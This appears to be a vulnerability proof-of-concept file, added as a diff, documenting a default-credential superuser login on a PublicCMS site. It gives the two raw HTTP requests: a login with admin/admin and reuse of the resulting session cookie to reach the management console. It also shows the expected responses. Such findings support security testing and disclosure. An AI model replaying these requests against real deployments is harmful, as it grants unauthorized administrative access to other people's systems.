@@ -1,0 +1,20 @@
+### VULN-001 — unauthenticated default-cred superuser via Host header
+### (1) Log in as the bundled demo superuser (site 2) with admin/admin
+POST /admin/login HTTP/1.1
+Host: site2.dev.publiccms.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 30
+
+username=admin&password=admin
+
+### -> HTTP/1.1 302
+### -> Set-Cookie: PUBLICCMS_ADMIN=2_<uuid>; ... (the "2_" prefix = sys_user id 2 = demo superuser)
+### -> Location: index.html
+
+### (2) Reuse the session cookie to open the site-2 management console
+GET /admin/index HTTP/1.1
+Host: site2.dev.publiccms.com
+Cookie: PUBLICCMS_ADMIN=2_<uuid-from-step-1>
+
+### -> HTTP/1.1 200
+### -> <title>企业中英文站点 - Management system</title>  (superuser dashboard)
